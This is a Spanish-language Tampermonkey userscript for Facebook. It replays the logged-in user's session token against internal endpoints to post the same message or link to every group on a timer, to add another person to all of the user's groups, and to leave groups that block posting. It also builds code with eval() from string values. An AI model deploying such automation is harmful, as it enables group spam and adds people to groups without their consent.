// ==UserScript==
// @name         Facebook Extras!
// @namespace    http://tampermonkey.net/
// @version      1.8
// @description  Añade funciones extras a facebook
// @author       Jose Enrique Ayala Villegas
// @match        https://www.facebook.com/*
// @require      http://code.jquery.com/jquery-latest.js
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/20996/Facebook%20Extras%21.user.js
// @updateURL https://update.greasyfork.org/scripts/20996/Facebook%20Extras%21.meta.js
// ==/UserScript==
console.log('Facebook Extras!');
declareAllfunctions();
try{
    document.querySelectorAll('*[data-profileid]')[0].getAttribute('data-profileid');
    $(function(){
        document.body.onmouseover = function(){
            u_0_12.onclick = function(){
                if(typeof itemadd == 'undefined'){
                    itemadd = document.createElement('li');
                    itemadd.className="_54ni";
                    itemadd.setAttribute('role','presentation');
                    itemadd.innerHTML = '<a onclick="PreguntaGF();" class="_54nc" id="addgroup">Añadir a mis Grupos</a>';
                    itemadd.onmouseover = function(){this.className = this.className + " _54ne selected";};
                    itemadd.onmouseout = function(){this.className=this.className.split(' ')[0];};
                    menu = document.querySelectorAll('ul[role="menu"]')[document.querySelectorAll('ul[role="menu"]').length-1];
                    menu.appendChild(itemadd);
                }
            };
        };
    });
}catch(e){console.log('Hubo un problema: '+e+" : "+location.href);}

function declareAllfunctions(){
    buble = function(){
        if(!$.contains(document, btnPublic)){
            $(btnPublic).insertAfter($('button').filter(function(){return this.innerHTML.indexOf('Publicar') != -1;})[0]);
        }
        setTimeout(buble,100);
    };
    createDivPublic = function (){
        if(typeof divpublic == 'undefined'){
            $("<style>")
                .prop("type", "text/css")
                .html("\
#divpublic input {\
display:block;\
float:left;\
width:80%;\
margin-left:10%;\
text-align:center;\
height:7%;\
}\
#divpublic span{\
display:block;\
margin-top:20px;\
width:80%;\
margin-left:10%;\
text-align:center;\
color:#C8FACA;\
font-size:1.6em;\
font-weight:bold;\
}\
#divpublic button{\
border:none;\
margin-left:10%;\
width:80%;\
margin-top:20px;\
height:7%;\
border-radius:5px;\
font-size:2em;\
}\
#divpublic button:hover{\
background:#C8FACA;\
cursor:pointer;\
}").appendTo("head");

            formPublic = '<button onclick="$(this.parentElement).hide();">Cerrar</button><span>Mensaje: </span><input><span>Titulo: </span><input><span>Descripcion: </span><input><span>Url: </span><input><span>Imagen-Url: </span><input><span>Intervalo de tiempo(segundos): </span><input><button id="pet">Publicar en todos</button></div>';
            divpublic = document.createElement('div');
            divpublic.setAttribute('style','position: fixed;width: 40%;background: rgba(0,0,0,0.6);height: 100vh;top: 0px;left: 30%;border-radius: 20px; z-index: 1000');
            divpublic.id = 'divpublic';
            divpublic.innerHTML = formPublic;
            document.body.appendChild(divpublic);
            pet.onclick = function(){publicAll();};
        } else {$(divpublic).show();}
    };
    if(location.href == "https://www.facebook.com/"){
        btnPublic = document.createElement('button');
        btnPublic.setAttribute('class','_1mf7 _4jy0 _4jy3 _4jy1 _51sy selected _42ft');
        btnPublic.innerHTML = "Publicar en Todos";
        btnPublic.onclick = createDivPublic;
        $(btnPublic).insertAfter($('button').filter(function(){return this.innerHTML.indexOf('Publicar') != -1;})[0]);
        buble();
    }
    RJ = function (e){
        b = e;
        c = b.substring(b.indexOf("{"));
        return(JSON.parse(c));
    };
    solid = function (url,data,callback){
        var xhttp = new XMLHttpRequest();
        xhttp.open("POST",url);
        xhttp.send(data);
        xhttp.onreadystatechange = function(){
            if (4 == xhttp.readyState&&200 == xhttp.status){
                callback(xhttp.responseText);
            }
        };
    };

    publicar = function (msg,id,enlace,url,title,desc,img){
        var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
        var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
        if(enlace){
            if(url === undefined){return false;}
            if(title === undefined){title='';}
            if(desc === undefined){desc='';}
            if(img === undefined){img='';}
        }
        datos = {
            'attachment[params][urlInfo][user]':url,
            'attachment[params][title]':title,
            'attachment[params][summary]':desc,
            'attachment[params][images][0]':img,
            'attachment[type]':'100',
            'xhpc_message':msg,
            'xhpc_composerid':'rc.js_23',
            'xhpc_targetid':id,
            '__a':'1',
            '__dyn':'7n8ahyj35CFIwd9e',
            '__req':'11',
            '__be':'-1',
            '__pc':'PHASED:DEFAULT',
            'fb_dtsg':fb_dtsg};//'AQEWvPllJPaB:AQEFf8PXC3Jk'};
        if(!enlace){
            delete datos['attachment[type]'];
        }

        $.ajax({
            type: "post",
            url: "https://www.facebook.com/ajax/updatestatus.php?av="+ user_id +"&dpr=1",
            dataType:'json',
            data: datos,
            complete:function(r){
                if(RJ(r.responseText).error === undefined) {
                    console.log('Perfecto');
                } else {
                    if(RJ(r.responseText).errorSummary == "Sin permiso para publicar"){
                        delGroup(id);
                    } else {
                        hayError = true;
                    }
                    console.log('Error: '+RJ(r.responseText).errorDescription);
                }
            }
        });
    };
    solicitud = function(tipo,url,callback){
        var newSolid = new XMLHttpRequest();
        newSolid.open(tipo,url);
        newSolid.onreadystatechange = function(){
            if(newSolid.readyState == 4 && newSolid.status == 200){
                callback(newSolid.response);
            }
        };
        newSolid.send();
    };


    public = function (msg,id){
        var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
        var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
        if(typeof id != 'undefined')
            solid('https://www.facebook.com/ajax/updatestatus.php?av='+user_id +'&dpr=1','attachment&backdated_date[year]&backdated_date[month]&backdated_date[day]&backdated_date[hour]&backdated_date[minute]&boosted_post_config&composertags_city&composertags_place&hide_object_attachment=true&is_explicit_place=false&is_markdown=false&is_q_and_a=false&is_profile_badge_post=false&multilingual_specified_lang=&num_keystrokes=18&place_attachment_setting=1&post_surfaces_blacklist&privacyx&prompt_id&prompt_tracking_string&xhpc_message='+msg +'&xhpc_message_text='+msg +'&is_forced_reshare_of_post&xc_disable_config[xc_disable_link]&is_react=true&xhpc_composerid=rc.js_4&xhpc_targetid='+id+'&xhpc_context=profile&xhpc_ismeta=1&xhpc_timeline=false&xhpc_finch=false&xhpc_socialplugin=false&xhpc_topicfeedid&xhpc_origintopicfeedid&xhpc_modal_composer=false&xhpc_aggregated_story_composer=false&xhpc_publish_type=1&xhpc_fundraiser_page=false&__user='+user_id +'&__a=1&__dyn=7n8ahyj35CFIwd9e&__req=11&__be=-1&__pc=PHASED%3ADEFAULT&fb_dtsg='+fb_dtsg,function(e){});
        else console.log("error");
    };



    getGroups = function (callback){
        var ac="";
        solicitud('GET','https://www.facebook.com/groups/?category=membership',function(e){
            h = document.createElement('html');
            h.innerHTML=e;
            h.querySelectorAll('div[class="_4-u3"]').forEach(function(e){
                ac+=e.id.replace('group_browse_','')+"%2C";
            });ac=ac.substring(0,ac.length-3);
            getMoreGroups(ac,callback);
        });
    };


    getMoreGroups = function (ac,callback){
        var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
        var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
        solicitud('GET','https://www.facebook.com/groups/more/?category=membership&existing_ids='+ac+"&style=group_browse&source=group_browse&dpr=1&__user="+user_id+"&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=",function(e){
            h = document.createElement('html');
            h.innerHTML=e;
            b = e;
            c = b.substring(b.indexOf("{"));
            d = JSON.parse(c);
            hh = document.createElement('html');
            if(d.domops[0][3] == null) {callback(ac);return true;}
            hh.innerHTML = d.domops[0][3]['__html'];
            hh.querySelectorAll('div[class="_4-u3"]').forEach(function(e){
                var idd=e.id.replace('group_browse_','');
                if(ac.split('%2C').indexOf(idd) == -1){console.log("Girando-"+ac.indexOf(idd));ac+="%2C"+idd;}
            });
            getMoreGroups(ac,callback);
        });
    };

    publicInAll = function (tiempo,msg){
        getGroups(function(e){
            var glist = e.split('%2C');
            for(var i=0; i<glist.length; i++){
                eval('setTimeout(function(){publicar(msg,'+glist[i]+');console.log("Grupo "+('+i+'+1)+" de "+glist.length);},tiempo*1000*(i+1));');
            }
        });
    };
    publicAll = function (){
        msg1 = $('#divpublic > input')[0].value;
        tit1 = $('#divpublic > input')[1].value;
        desc1 = $('#divpublic > input')[2].value;
        url1 = $('#divpublic > input')[3].value;
        img1 = $('#divpublic > input')[4].value;
        tiempo = parseInt($('#divpublic > input')[5].value);
        getGroups(function(e){
            var glist = e.split('%2C');
            for(var i=0; i<glist.length; i++){
                eval('setTimeout(function(){if(typeof hayError != "undefined")return true;publicar('+'msg1,'+glist[i]+',true,url1,tit1,desc1,img1)'+';console.log("Grupo "+('+i+'+1)+" de "+'+glist.length+');},'+tiempo+'*1000*('+(i+1)+'));');
            }
        });
    };

    addUser = function (gid,mid){
        var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
        var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
        solid(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?dpr=1","fb_dtsg="+ fb_dtsg + "&group_id=" + gid + "&source=typeahead&ref=&message_id=u_0_m&members=" + mid + "&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=1r&__be=-1", function () {});
    };
    delGroup = function (id){
        var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
        $.ajax({
            type: "post",
            url: "https://www.facebook.com/ajax/groups/membership/leave.php?group_id="+id+"&dpr=1",
            data: {
                'confirmed':'1',
                '__a':'1',
                '__dyn':'7n8ahyj35CFIwd9e',
                '__req':'11',
                '__be':'-1',
                '__pc':'PHASED:DEFAULT',
                'fb_dtsg':fb_dtsg},
            complete:function(){console.log("Grupo '"+id+"' eliminado(no puede publicar)");}
        });
    };
    addGroup = function (gid){
        var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
        var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
        $.ajax({
            type: "post",
            url: "https://www.facebook.com/ajax/groups/membership/r2j.php?dpr=1",
            data: {
                'ref':'group_jump_header',
                'group_id':gid,
                'nctr[_mod]':'pagelet_group_',
                '__a':'1',
                '__dyn':'7n8ahyj35CFIwd9e',
                '__req':'11',
                '__be':'-1',
                '__pc':'PHASED:DEFAULT',
                'fb_dtsg':fb_dtsg}
        });
    };
    getFriends = function (callback){
        var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
        var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
        solicitud('get',"https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1&filter\[0\]=user&lazy=0&viewer="+user_id+"&token=v7&stale_ok=0&",function(e){
            var b = e;
            var c = b.substring(b.indexOf("{"));
            d = JSON.parse(c);
            d = d.payload.entries;
            if(typeof callback != 'undefined'){callback(d);}
        });
    };

    addToAllGroup = function (userid){
        var uid = document.querySelectorAll('*[data-profileid][data-flloc="profile_button"]')[0].getAttribute('data-profileid');
        var interval = parseInt(addInterval.value);
        getGroups(function(e){
            var glist = e.split('%2C');
            for(var i=0; i<glist.length; i++){
                eval('setTimeout(function(){'+"addUser("+glist[i]+","+uid+");logfb.textContent='Añadiendo al grupo "+(i+1) + " de "+ glist.length+"';"+"},"+(interval*1000)*i +")");
            }
            setTimeout(function(){logfb.textContent = "Listo, Completado";},(interval*1000)*glist.length);
        });
    };
    PreguntaGF = function(){
        var dst = '<div class="_3ixn"></div> <div class="_59s7" role="dialog" aria-labelledby="u_1s_1" style="width: 445px; margin-top: 52px;"> <div class="_4t2a" style="position:fixed;"> <div style="opacity: 1; width: 445px;"> <div> <div class="_4-i0" id="u_1s_1"> <div class="clearfix"> <div class="lfloat _ohe"> <h3 class="_52c9">Añadir a todos tus grupos</h3></div> <div class="_51-u rfloat _ohf"></div> </div> </div> <div class="_4-i2 _57_a _50f4">Seguro que quieres añadir a esta persona a todos tus grupos? <p>Si es asi haz click en Comenzar</p> <spam>Intervalo (Segundos): </spam><input style="border:solid 2px; text-align:center;" id="addInterval"><p id="logfb"></p> </div> <div class="_5lnf uiOverlayFooter _5a8u"> <a class="_42ft _4jy0 layerCancel uiOverlayButton _4jy3 _517h _51sy" role="button" href="#" onclick="u_1s_0.remove();">Cancelar</a> <button class="_42ft _4jy0 layerConfirm uiOverlayButton _4jy3 _4jy1 selected _51sy" onclick="addToAllGroup();";>Comenzar</button> </div> </div> </div> </div> </div>';
        var dpt = document.createElement('div');
        dpt.className='_10 uiLayer _4-hy _3qw';
        dpt.id="u_1s_0";
        dpt.innerHTML = dst;
        document.body.appendChild(dpt);
    };
}